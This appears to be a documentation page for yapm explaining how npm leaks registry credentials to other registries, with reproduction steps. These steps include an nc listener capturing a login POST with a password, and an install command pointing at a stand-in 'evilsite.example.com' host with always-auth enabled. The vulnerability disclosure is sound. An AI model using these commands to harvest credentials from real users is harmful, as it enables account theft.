Registry-specific configuraion: security fixes
----------------------------------------------

`npm` has one configuration for all registries. If you're using different registries, `npm` can leak your credentials from one registry to another. Also, user can be tricked to expose his credentials with a crafted command-line string.

`yapm` has separate configurations for each registry, which means this flaw doesn't exist anymore.



It means that if you authenticated to one registry, but request another one, it can expose sensitive information to that registry. It's extremely important if you use multiple registries administered by different people.

Think about a browser that shares authentication info with all websites. If one website is storing a cookie, your browser will sent it with all requests. If you use just one website, this approach is good. But if you use several of them, this is a critical security flaw.

### This is how you can replicate this bug:

Authenticate yourself in the main registry:

```
$ npm adduser --registry http://registry.npmjs.org/
```

Create and publish a new package:

```
$ mkdir test ; cd test ; echo '{"name":"test","version":"0.0.0"}' > package.json
$ npm publish --registry http://localhost:8080/
```

Listen for all requests on some port in a separate terminal:

```
$ nc -l 8080
POST /_session HTTP/1.1
host: localhost:8080
accept: application/json
content-type: application/json
content-length: 40
Connection: keep-alive

{"name":"test","password":"test"}
```

Do you see it? `npm` is leaking your password to another registry, even though you didn't write it explicitly.

### always-auth issues

It is getting even worse with `always-auth` setting on.

```
$ npm install foobar --reg http://evilsite.example.com/ --always-auth=true
```

